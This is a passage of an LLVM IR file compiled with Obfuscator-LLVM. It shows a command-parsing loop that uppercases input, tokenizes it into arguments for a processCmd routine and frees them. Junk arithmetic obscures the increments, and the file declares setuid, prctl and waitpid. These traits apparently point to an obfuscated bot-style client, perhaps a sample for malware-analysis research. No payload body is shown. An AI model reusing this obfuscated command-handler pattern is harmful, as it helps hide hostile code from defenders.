  %315 = getelementptr inbounds i8, i8* %314, i32 1
  store i8* %315, i8** %15, align 8
  %316 = load i8*, i8** %17, align 8
  store i8* %316, i8** %18, align 8
  br label %317

; <label>:317:                                    ; preds = %321, %312
  %318 = load i8*, i8** %18, align 8
  %319 = load i8, i8* %318, align 1
  %320 = icmp ne i8 %319, 0
  br i1 %320, label %321, label %330

; <label>:321:                                    ; preds = %317
  %322 = load i8*, i8** %18, align 8
  %323 = load i8, i8* %322, align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 @toupper(i32 %324) #9
  %326 = trunc i32 %325 to i8
  %327 = load i8*, i8** %18, align 8
  store i8 %326, i8* %327, align 1
  %328 = load i8*, i8** %18, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %18, align 8
  br label %317

; <label>:330:                                    ; preds = %317
  store i32 1, i32* %20, align 4
  %331 = load i8*, i8** %15, align 8
  %332 = call i8* @strtok(i8* %331, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i32 0, i32 0)) #5
  store i8* %332, i8** %21, align 8
  %333 = load i8*, i8** %17, align 8
  %334 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %333, i8** %334, align 16
  br label %335

; <label>:335:                                    ; preds = %374, %330
  %336 = load i8*, i8** %21, align 8
  %337 = icmp ne i8* %336, null
  br i1 %337, label %338, label %376

; <label>:338:                                    ; preds = %335
  %339 = load i8*, i8** %21, align 8
  %340 = load i8, i8* %339, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp ne i32 %341, 10
  br i1 %342, label %343, label %374

; <label>:343:                                    ; preds = %338
  %344 = load i8*, i8** %21, align 8
  %345 = call i64 @strlen(i8* %344) #9
  %346 = sub i64 0, %345
  %347 = sub i64 0, 1
  %348 = add i64 %346, %347
  %349 = sub i64 0, %348
  %350 = add i64 %345, 1
  %351 = call noalias i8* @malloc(i64 %349) #5
  %352 = load i32, i32* %20, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %353
  store i8* %351, i8** %354, align 8
  %355 = load i32, i32* %20, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %356
  %358 = load i8*, i8** %357, align 8
  %359 = load i8*, i8** %21, align 8
  %360 = call i64 @strlen(i8* %359) #9
  %361 = sub i64 0, 1
  %362 = sub i64 %360, %361
  %363 = add i64 %360, 1
  call void @llvm.memset.p0i8.i64(i8* %358, i8 0, i64 %362, i32 1, i1 false)
  %364 = load i32, i32* %20, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %365
  %367 = load i8*, i8** %366, align 8
  %368 = load i8*, i8** %21, align 8
  %369 = call i8* @strcpy(i8* %367, i8* %368) #5
  %370 = load i32, i32* %20, align 4
  %371 = sub i32 0, 1
  %372 = sub i32 %370, %371
  %373 = add nsw i32 %370, 1
  store i32 %372, i32* %20, align 4
  br label %374

; <label>:374:                                    ; preds = %343, %338
  %375 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i32 0, i32 0)) #5
  store i8* %375, i8** %21, align 8
  br label %335

; <label>:376:                                    ; preds = %335
  %377 = load i32, i32* %20, align 4
  %378 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %377, i8** %378)
  %379 = load i32, i32* %20, align 4
  %380 = icmp sgt i32 %379, 1
  br i1 %380, label %381, label %398

; <label>:381:                                    ; preds = %376
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %382

; <label>:382:                                    ; preds = %391, %381
  %383 = load i32, i32* %22, align 4
  %384 = load i32, i32* %20, align 4
  %385 = icmp slt i32 %383, %384
  br i1 %385, label %386, label %397

; <label>:386:                                    ; preds = %382
  %387 = load i32, i32* %22, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %388
  %390 = load i8*, i8** %389, align 8
  call void @free(i8* %390) #5
  br label %391

; <label>:391:                                    ; preds = %386
  %392 = load i32, i32* %22, align 4
  %393 = add i32 %392, -1648818926
  %394 = add i32 %393, 1
  %395 = sub i32 %394, -1648818926
  %396 = add nsw i32 %392, 1
  store i32 %395, i32* %22, align 4
  br label %382

; <label>:397:                                    ; preds = %382
  br label %398

; <label>:398:                                    ; preds = %397, %376
  br label %399

; <label>:399:                                    ; preds = %398, %222
  br label %100

; <label>:400:                                    ; preds = %100
  br label %401

; <label>:401:                                    ; preds = %400, %87
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146509988}
!2 = !{i32 -2146508860}
!3 = !{i32 -2146508169}
!4 = !{i32 -2146507420}
!5 = !{i32 -2146506481}
!6 = !{i32 -2146505392}
